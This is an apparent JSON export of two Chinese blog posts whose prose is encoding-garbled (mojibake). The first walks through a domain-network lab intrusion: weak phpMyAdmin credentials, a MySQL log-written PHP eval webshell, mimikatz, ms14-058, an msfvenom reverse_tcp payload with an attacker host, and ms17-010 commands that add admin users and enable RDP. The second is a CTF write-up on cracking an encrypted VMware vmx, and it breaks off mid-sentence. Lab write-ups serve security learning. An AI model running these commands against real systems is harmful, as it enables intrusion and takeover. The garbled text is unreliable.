[{"content":"1.ç¯å¢ƒæ­å»º å‚è€ƒä»¥ä¸‹æ–‡ç« ,ä¸åšè¿‡å¤šå™è¿°\n\u0026lt;https://blog.csdn.net/m0_46363249/article/details/121441832\n2.æ‹“æ‰‘å›¾å’Œæœºå™¨ä¿¡æ¯ 3.æ‰“ç‚¹ ç«¯å£æ‰«æå‘ç°80ç«™ç‚¹å’Œ3306mysqlæœåŠ¡\nè®¿é—®httpå‘ç°phpstudyæ¢é’ˆ\nä½¿ç”¨hydraå‘ç°æ— æ³•è¿æ¥\næˆªåŒ…å°è¯•çˆ†ç ´å‘ç°ä¸€ä¸ªå¼‚å¸¸é•¿åº¦\nè¿”å›åŒ…çœ‹ä¸å‡ºä»€ä¹ˆ,åˆ°webç•Œé¢æ‰‹åŠ¨è¾“å…¥root,rootå‘ç°è¿æ¥æ­£å¸¸è¯´æ˜å­˜åœ¨å¼±å£ä»¤root/root\nå°è¯•è¿æ¥å‘ç°ä¸å…è®¸ä»å¤–éƒ¨è¿æ¥\næå‡º82å¹´çš„ç¬”è®°,æŒ‰ç†è¯´phpstudyæ­å»ºåº”è¯¥æœ‰phpadmin\nè®¿é—®è·¯å¾„å‘ç°çš„ç¡®å­˜åœ¨\nä½¿ç”¨å¼±å£ä»¤root/rootæˆåŠŸè¿›å…¥\nå‘ç°æ˜¯èƒ½å¤Ÿæ‰§è¡Œsqlè¯­å¥çš„\næ¥ä¸‹æ¥æˆ‘ä»¬å°è¯•åˆ©ç”¨mysql å†™å…¥webshell\n1 2 3 4 5 6 7 8 #mysqlå†™å…¥webshelléœ€è¦çš„æ¡ä»¶ 1.mysqlç”¨æˆ·ä¸ºrootæˆ–dbaèµ‹æƒè¾ƒé«˜ç”¨æˆ· 2.æœ‰å†™å…¥æƒé™(FILE) 3.çŸ¥é“ç½‘ç«™çš„ç»å¯¹è·¯å¾„ 4.æœåŠ¡å™¨é…ç½®secure_file_priv è¯¥é€‰é¡¹ä¸ºç©ºä»£è¡¨å¯ä»¥å†™å…¥ä»»ä½•ç›®å½• è¯¥é€‰é¡¹å¦‚æœæœ‰ç›®å½•åˆ™ä»£è¡¨åªå…è®¸å†™å…¥è¯¥ç›®å½•ä¸‹æ–‡ä»¶ è¯¥é€‰é¡¹ä¸ºnullä»£è¡¨æ²¡æœ‰æƒé™ æŸ¥è¯¢\u0026quot;secure_file_priv\u0026quot;\nå‘ç°ä¸ºnullå°±æ˜¯æ²¡æœ‰å†™å…¥æƒé™\næŸ¥è¯¢ä¸€ä¸‹æ—¥å¿—åŠŸèƒ½,å°è¯•åˆ©ç”¨æ—¥å¿—getshell\nå…³é—­äº†ä½†æ˜¯æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨å¼€å¯,è¾“å…¥sqlè¯­å¥SET GLOBAL general_log = ON;æ‰§è¡ŒæˆåŠŸå¼€å¯\næˆ‘è¿™é‡Œå·çª¥äº†ä¸€ä¸‹ç«™ç‚¹ç›®å½•,è¿™ä¸ªåº”è¯¥è®°ä½!\næ¥ä¸‹æ¥çš„æ€è·¯æ˜¯è®¾ç½®æ—¥å¿—æ–‡ä»¶å†™åˆ°ä¸€ä¸ªphpæ–‡ä»¶ä¸­,SET GLOBAL general_log_file = 'C:/phpstudy/WWW/test.php';\n1 2 #è¿™é‡Œå‰é¢ä¸èƒ½åŠ @ select \u0026#39;\u0026lt;?php eval($_POST[gucheng]);?\u0026gt;\u0026#39;; è¿›æ¥åå‘ç°è¿˜æœ‰ä¸ªç½‘ç«™yxcms,æˆ‘ä»¬ç»ƒä¹ éƒ½æ‰“ä¸€ä¸‹\næ£±æ´æ‰«äº†ä¸‹å‘ç°è¿™cmså°±å«è¿™ä¸ª\næŸ¥çœ‹ç½‘é¡µæºä»£ç å‘ç°é»˜è®¤å£ä»¤\nåˆ°æŒ‡å®šè·¯å¾„è¾“å…¥é»˜è®¤å£ä»¤æˆåŠŸç™»å…¥,ä¿®æ”¹æ¨¡ç‰ˆindex_index.php\nå†™å…¥ä¸€å¥é©¬\nèšå‰‘æˆåŠŸè¿æ¥\n4.å†…ç½‘æ¸—é€ ä¹‹å‰ä¸€ç›´å†…ç½‘æ‰‹æ¸—é€,ä¸‹é¢å°±ç”¨csæ“ä½œäº†,ä¸»è¦æ˜¯å†…ç½‘ä¿¡æ¯æ”¶é›†æ’ä»¶æ–¹ä¾¿ç‚¹\nå°†ç”Ÿæˆé©¬ä¸Šä¼ åˆ°ç«™ç‚¹ç›®å½•ä¸‹è¿è¡Œä¸Šçº¿\nladonæ’ä»¶ icmpæ£€æµ‹ä¸»æœºå­˜æ´»ä¸€è‡´\nå‘ç°å­˜åœ¨åŸŸç¯å¢ƒ,åŸŸåä¸ºgod.org\nladon infoscanæ•´ä¸ªç½‘æ®µç¡®å®å¦‚æ­¤\nç°åœ¨æ˜¯administratoræƒé™,å¯ä»¥å°è¯•æåˆ°systemæƒé™\nä¸Šä¼ ä¸ªncåˆ°c:\\windows\\tempç›®å½•\nå¼¹è¿‡æ¥æ²¡ååº”\nmimikatzæŠ“å–åˆ°å¯†ç \nå°è¯•ç”¨psexecè¿æ¥ä¹Ÿä¸è¡Œ\næŸ¥çœ‹ä¸€ä¸‹ç³»ç»Ÿä¿¡æ¯,æ‰“äº†ä»€ä¹ˆè¡¥ä¸\nä½¿ç”¨æ¢¼æŒä¸­çš„ms14-058ææƒæˆåŠŸ\nä¸Šé¢æçš„å¥½åƒæ˜¯æœ‰ç‚¹é—®é¢˜,Windowsåº”è¯¥æ˜¯3389è¿œç¨‹æ¡Œé¢è¿æ¥,é‡æ–°æä¸‹\næ‰§è¡Œnetstat -anoæœªå‘ç°3389ç«¯å£å¼€å¯\n1 2 3 4 5 6 é€šè¿‡ä»¥ä¸‹å‘½ä»¤æŸ¥è¯¢æ³¨å†Œè¡¨æ¥æŸ¥çœ‹ RDP æœåŠ¡æ˜¯å¦å¼€å¯ï¼š REG QUERY \u0026#34;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\u0026#34; /v fDenyTSConnections # æŸ¥çœ‹RDPæœåŠ¡æ˜¯å¦å¼€å¯: 1å…³é—­, 0å¼€å¯ REG QUERY \u0026#34;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\ WinStations\\RDP-Tcp\u0026#34; /v PortNumber # æŸ¥çœ‹ RDP æœåŠ¡çš„ç«¯å£ ä¸º1å…³é—­\nä½¿ç”¨å‘½ä»¤REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026quot; \u0026quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /fæ‰‹åŠ¨å¼€å¯\nä¸º0æˆåŠŸå¼€å¯\nå†ä½¿ç”¨å‘½ä»¤é…ç½®ä¸€ä¸‹é˜²ç«å¢™å…è®¸è¿æ¥\n1 netsh advfirewall firewall add rule name=\u0026#34;Remote Desktop\u0026#34; protocol=TCP dir=in localport=3389 action=allow æ¥ä¸‹æ¥å¯ä»¥ä½¿ç”¨kaliè‡ªå¸¦çš„xfreerdpè¿›è¡Œè¿æ¥,æˆ‘è¿™é‡Œä¸ºäº†åæœŸæ¸—é€æ–¹ä¾¿é€‰æ‹©msfçš„\nå…ˆä½¿ç”¨msfvenomç»„ä»¶ç”Ÿæˆä¸€ä¸ªé©¬\n1 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.52.128 lport=4444 -f exe -o /root/Desktop/shell.exe ä¼ ä¸Šå»æ‰§è¡Œåæ‹¿åˆ°meterpreterä¼šè¯\nææƒåˆ°system\n1 2 3 run post/windows/manage/enable_rdp #å¼€å¯è¿œç¨‹æ¡Œé¢ ä¼šç”Ÿæˆä¸€ä¸ªæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å¯ç”¨æ¥ å†å…³é—­è¿œç¨‹æ¡Œé¢ run multi_console_command -r æ–‡ä»¶åœ°å€ æ¥ä¸‹æ¥åšåŸŸå†…ä¿¡æ¯æ”¶é›†å‡†å¤‡æ¨ªå‘\nè¾“å…¥net viewå‘ç°å¦å¤–ä¸¤å°ä¸»æœº\næ±‡æ€»ä¸€ä¸‹ä¿¡æ¯\n1 2 3 4 5 6 7 8 9 10 åŸŸå:god.org åŸŸæ§:OWA åŸŸå†…ç”¨æˆ·ä¸‰ä¸ª: Administrator ligang liukaifeng01 åŸŸå†…ä¸»æœºä¸‰å°: STU1(win7) 192.168.52.143 OWA 192.168.52.138 ROOT-TVI862UBEH 192.168.52.141 4.1 ä½¿ç”¨proxychainsä»£ç†: æ·»åŠ å†…ç½‘è·¯ç”± run autoroute -s 192.168.52.0/24ï¼ŒæŸ¥çœ‹ä¸€ä¸‹arpç¼“å­˜è¡¨å­˜åœ¨52ç½‘æ®µ\nbackgroundè¿”å›ä¸€ä¸‹,ä½¿ç”¨socksä»£ç†æ¨¡å—\n1 2 3 4 5 6 7 8 msf6 auxiliary(server/socks_proxy) \u0026gt; use auxiliary/server/socks_proxy msf6 auxiliary(server/socks_proxy) \u0026gt; show options msf6 auxiliary(server/socks_proxy) \u0026gt; set VERSION 5 VERSION =\u0026gt; 5 msf6 auxiliary(server/socks_proxy) \u0026gt; set username admin username =\u0026gt; admin msf6 auxiliary(server/socks_proxy) \u0026gt; set password admin msf6 auxiliary(server/socks_proxy) \u0026gt; run é‡æ–°å¼€ä¸ªç»ˆç«¯vim /etc/proxychains.conf,å¦‚ä¸‹é…ç½®\nè¿”å›msf6,è¾“å…¥proxychains curl http://192.168.52.143/yxcms/index.php,æµ‹è¯•å¯ä»¥æˆåŠŸè®¿é—®192.168.52.0ç½‘æ®µ\n4.2 CSç›´æ¥å»ºç«‹socks5ä»£ç† å³é”®ç‚¹å‡»æœºå™¨-\u0026gt;ä»£ç†è½¬å‘-\u0026gt;socksä»£ç†,å‘ç°æ˜¯62549ç«¯å£\nproxifieræ£€æµ‹æˆåŠŸ,è¿˜æ˜¯è¿™ä¸ªæ›´æ–¹ä¾¿ç‚¹\nå†åœ¨ä»£ç†è§„åˆ™é€‰æ‹©åˆšæ‰é‚£ä¸ªå³å¯\n4.3 æ¸—é€åŒåŸŸä¸»æœº192.168.52.141 proxychains nmap -Pn 192.168.52.141\né€šè¿‡445smbç«¯å£æ£€æµ‹æ“ä½œç³»ç»Ÿä¸ºWindows server2003,proxychains nmap -sV 192.168.52.141 -p 445\næœäº†ä¸€ä¸‹2003å…¨æ˜¯æ°¸æ’ä¹‹è“\nå…ˆç”¨ç¬¬ä¸‰ä¸ªæ¨¡å—æ£€æµ‹ä¸€ä¸‹\nç›´æ¥ä½¿ç”¨msfé‡Œé¢çš„æ”»å‡»æ¨¡å—äº†(ms17-010)å‘ç°æ¥æ”¶ä¸äº†session,ä½¿ç”¨msfçš„ä»£ç†ä¹‹åå°±ä¸èƒ½ä½¿ç”¨åå‘shelläº†ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨æ­£å‘shellã€‚\næ¢ç”¨è¿™ä¸ªä»£ç æ‰§è¡Œè¯•è¯•use auxiliary/admin/smb/ms17_010_command\nä»£ç æˆåŠŸè¿è¡Œ\næ¥ä¸‹æ¥æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤\n1 2 3 4 5 6 set command net user gucheng !@#123qwe!@# /add #æ·»åŠ ç”¨æˆ· run set command net localgroup administrators gucheng /add #ç®¡ç†å‘˜æƒé™ run set command \u0026#39;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\u0026#39;\t#å¼€å¯rdp run ä½¿ç”¨rdesktopè¿æ¥proxychains rdesktop 192.168.52.141\nè¿æ¥æˆåŠŸ\nmsfè®¾ç½®æ­£åå‘shelléƒ½æ‰“ä¸é€šä¸çŸ¥é“ä¸ºå•¥,ç™»ä¸ªè¿œç¨‹æ¡Œé¢ç®—äº†\n4.4 æ‰“åŸŸæ§ æ‰«æç«¯å£,å‘ç°445åˆå¼€å¯äº†\næ¥ä¸‹æ¥æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤\n1 2 3 4 5 6 7 8 set command net user gucheng2 !@#123qwe!@# /add #æ·»åŠ ç”¨æˆ· run set command net localgroup administrators gucheng2 /add #ç®¡ç†å‘˜æƒé™ run set command netsh advfirewall firewall add rule name=\u0026#34;Remote Desktop\u0026#34; protocol=TCP dir=in localport=3389 action=allow\t#å¼€å¯é˜²ç«å¢™ç«¯å£ run set command \u0026#39;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\u0026#39;\t#å¼€å¯rdp run åˆ›å»ºæˆåŠŸ\nproxychains rdesktop 192.168.52.138 å‘ç°è¿æ¥ä¸äº†,ç«¯å£filtered,è£‚å¼€,è¿™ä¸ªmsfçš„æ¨¡å—æ‰“ä¸é€šä¸çŸ¥é“å•¥åŸå› ,ä»¥åå†ç ”ç©¶è‰¹\n","date":"2024-12-08T12:19:00+08:00","permalink":"http://gucheng.me/p/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/","title":"çº¢æ—¥å†…ç½‘é¶åœº1"},{"content":"ç›®å‰åšè¿‡çš„å†…å­˜å–è¯é¢˜ä¸å¤š,è¿™é“é¢˜éš¾åº¦è¾ƒé«˜å…·æœ‰å¯å‘æ„ä¹‰,æ‰€ä»¥è®°å½•ä¸€ä¸‹ç•™ä½œä»¥åå‚ç…§\nå¤ç°åœ°å€:\u0026lt;[é™‡å‰‘æ¯ 2021]æœºå¯†å†…å­˜ï¼ˆé—®1ï¼‰ | NSSCTF\u0026gt;\nçŸ¥è¯†äº†è§£ä¹‹vmwareè™šæ‹Ÿæœºæ–‡ä»¶ç±»å‹ æ€è€ƒè¿‡ç¨‹ è§£å‹åæ‹¿åˆ°ä¸‰ä¸ªæ–‡ä»¶,vmemä¸ºåˆ†é¡µå¤‡ä»½æ–‡ä»¶, å…¶ä½™ä¸¤ä¸ªæ–‡ä»¶ç±»å‹æš‚æ—¶ä¸æ¸…æ¥š. å…ˆå°è¯•æå–å‘ç°æœç„¶æ˜¯ä¸è¡Œçš„\næ¥ä¸‹æ¥çœ‹çœ‹å¦å¤–ä¸¤ä¸ªæ–‡ä»¶\næ‰“å¼€Encryption.bin01å‘ç°ä¸ºä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶\næ ¹æ®æ–‡ä»¶å¤§å°æ•°åƒkbå’Œæœ¬åœ°çš„vmssæ–‡ä»¶(è™šæ‹ŸæœºæŒ‚èµ·æ—¶è®°å½•çŠ¶æ€çš„æ–‡ä»¶)è¿›è¡Œå¯¹æ¯”åˆ¤æ–­Encryption.bin01ä¸ºvmssæ–‡ä»¶\nå°†Encryption.bin01æ–‡ä»¶é‡å‘½åä¸ºmem_secret-963a4663.vmssï¼Œvmssæ–‡ä»¶çš„æ–‡ä»¶åä¸€å®šè¦å’Œvmemæ–‡ä»¶åå¯¹åº”ï¼Œå¦åˆ™æ— æ³•è¯»å–æŒ‚èµ·çš„çŠ¶æ€\nç„¶åæ‰“å¼€Encryption.bin02æ–‡ä»¶å‘ç°ä¸€åŠæ˜¯æŸç§åŠ å¯†å¯è§å­—ç¬¦ä¸²,å¦ä¸€åŠå‡ºç°è¾ƒå¤šä¹±ç \nå°†ååŠä¸­çš„æœªåŠ å¯†å­—ç¬¦ä¸²è¿›è¡Œæœç´¢å‘ç°æåˆ°åŠ å¯†å’Œvmxæ–‡ä»¶\næ‰“å¼€æœ¬åœ°kaliçš„vmxæ–‡ä»¶å‘ç°æ˜¯ä¸€äº›é…ç½®,ç”±æ­¤çœ‹æ¥æ˜¯å¯¹é…ç½®ä¿¡æ¯è¿›è¡Œäº†åŠ å¯†\næ‹¿æˆ‘æœ¬åœ°å¦ä¸€å°æœºå™¨åŠ å¯†å®éªŒä¸€ä¸‹\nåŠ å¯†åæ‰“å¼€ç¡®å®å‘ç°å¤§é‡åŠ å¯†å­—ç¬¦ä¸²,ä½†æ˜¯å¤´éƒ¨å‘ç°äº†ä¸€äº›ä¿¡æ¯æ˜¯bin02æ–‡ä»¶æ²¡æœ‰çš„,åˆ¤æ–­éƒ¨åˆ†å…³é”®ä¿¡æ¯è¢«å‡ºé¢˜äººåˆ äº†,æˆ‘ä»¬éœ€è¦è¿›è¡Œä¿®å¤. è¿˜æœ‰åœ¨vmxåŠ å¯†æ–‡ä»¶ä¸­æœªå‘ç°ä¸å¯è§å­—ç¬¦ä¸²,æ‰€ä»¥åˆ¤æ–­bin02æ–‡ä»¶ååŠéƒ¨åˆ†æ˜¯å¦å¤–ä¸€ä¸ªæ–‡ä»¶\nä½¿ç”¨010å°†ååŠæ®µå•ç‹¬æå‡ºæ¥åˆ°ä¸€ä¸ª16è¿›åˆ¶æ–‡æœ¬,\nå°†å…³é”®å­—lsilogicä¸¢å…¥gpt,å› ä¸ºæˆ‘ä»¬å·²ç»åˆ¤æ–­å‡ºå‰åŠéƒ¨åˆ†ä¸ºvmxæ–‡ä»¶,æ‰€ä»¥æˆ‘ä»¬ä¸vmdkæ–‡ä»¶ä½œå¯¹æ¯”çœ‹çœ‹\nç»è¿‡æ¯”å¯¹å‘ç°å¤§é‡ç›¸ä¼¼ç‰¹å¾,010å¯¼å‡ºåå‘½åä¸ºvmemæ–‡ä»¶å+vmdk\næ³¨æ„: è¿™é‡Œä¸€å®šè¦æ‘†è„±åˆ»æ¿å°è±¡,ä¸æ˜¯æ‰€æœ‰vmdkæ–‡ä»¶éƒ½å¾ˆå¤§!\næ¥ä¸‹æ¥å°±æ˜¯ä¿®å¤vmxæ–‡ä»¶ç„¶åå°è¯•æŒ‚è½½è¯¥è™šæ‹Ÿæœºç„¶åè§£é™¤åŠ å¯†å³å¯å¾—åˆ°æ˜æ–‡æ–‡ä»¶è¿›è¡Œå†…å­˜å–è¯\nä»¥ä¸‹åœ°æ–¹éœ€è¦è¿›è¡Œä¿®å¤, æŒ‰ç…§æœ¬åœ°åŠ å¯†çš„æ ·æœ¬æ¥è¿›è¡Œä¿®å¤bin02æ–‡ä»¶\nä¸Šé¢å·²ç»å°†ååŠéƒ¨åˆ†æå–å‡ºå», ç›´æ¥æ”¹ä¸ºvmxæ–‡ä»¶, è‡³æ­¤å®Œæˆä¿®å¤å·¥ä½œ\nè§£é™¤å¯†ç ä¿æŠ¤ åäº†è¿™é‡Œ,å¼€å§‹å°‘æ‰“äº†ä¸€ä¸ªç©ºæ ¼ä¸€ç›´å¯¼ä¸è¿›å»md\nvmxæ–‡ä»¶å†…å®¹\n1 2 3 4 .encoding = \u0026#34;GBK\u0026#34; displayName = \u0026#34;buzhidao\u0026#34; encryption.keySafe = \u0026#34;vmware:key/list/(pair/(phrase/Dg7Se8rqkNI%3d/pass2key%3dPBKDF2%2dHMAC%2dSHA%2d1%3acipher%3dAES%2d256%3arounds%3d10000%3asalt%3d%2b21PdYUqEQd1wdT2AoPEQw%253d%253d,HMAC%2dSHA%2d1,CgKwC5U7lfLjpVohwbpxufC11yU4a0%2byrP08oY0KDDcP1NL%2fRiLojwTz2JnYqm7baAhtgENYUeFUHXwODjSClaJ%2bSRBhKw6UwET6p3AYK8vs4T0cBrvTjYSrs0baLgG7dozcvL5JxA%2fKYJvriz4Mf%2bMmVvE%3d))\u0026#34; encryption.data =\u0026#34;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\u0026#34; æç¤ºè™šæ‹ŸæœºåŠ å¯†, å¯ä»¥ä½¿ç”¨è¿™ä¸ªé¡¹ç›®æ¥å°è¯•ç ´è§£å¯†ç https://github.com/axcheron/pyvmx-cracker\nå‘½ä»¤:\npython39 .\\pyvmx-cracker.py -v mem_secret.vmx -d wordlist.txt\nå¾—åˆ°å¯†ç :1q2w3e4r\næ¥ä¸‹æ¥å°±æ˜¯ç§»é™¤åŠ å¯†\nç»“æœå´å‘ç°æ— æ³•ç§»é™¤åŠ å¯†,ç£ç›˜é—®é¢˜,è¯´æ˜vmdkæ–‡ä»¶ä»ç„¶å­˜åœ¨é—®é¢˜\næ¢å¤vmdk è¿™ä¸ªç•Œé¢å¾ˆæ˜æ˜¾æ˜¯win10\né€šè¿‡ä¹‹å‰çš„æ¯”å¯¹æˆ‘ä»¬ç°åœ¨éœ€è¦ä¸€ä¸ªåˆæ³•çš„æ–‡ä»¶å¤´ä¸å¡«å……ã€‚æ‰€ä»¥é‡æ–°åˆ›å»ºä¸€ä¸ªwin10è™šæ‹Ÿæœºï¼Œæ­¤æ—¶å¹¶ä¸éœ€è¦å»å®‰è£…win10ç³»ç»Ÿï¼ˆå› ä¸ºæˆ‘ä»¬çš„ç›®çš„åªæ˜¯è·å–åˆ°æ­£ç¡®çš„vmdkæ–‡ä»¶ï¼ŒVMwareåœ¨æˆ‘ä»¬å®‰è£…ç³»ç»Ÿå‰ä¾¿å·²ç»ä¸ºæˆ‘ä»¬ç”Ÿæˆï¼‰ï¼Œå†ç”¨ä»»æ„çš„å¯†ç åŠ å¯†è¿™ä¸ªwin10è™šæ‹Ÿæœºå¾—åˆ°åŒä¸€å¯†ç åŠ 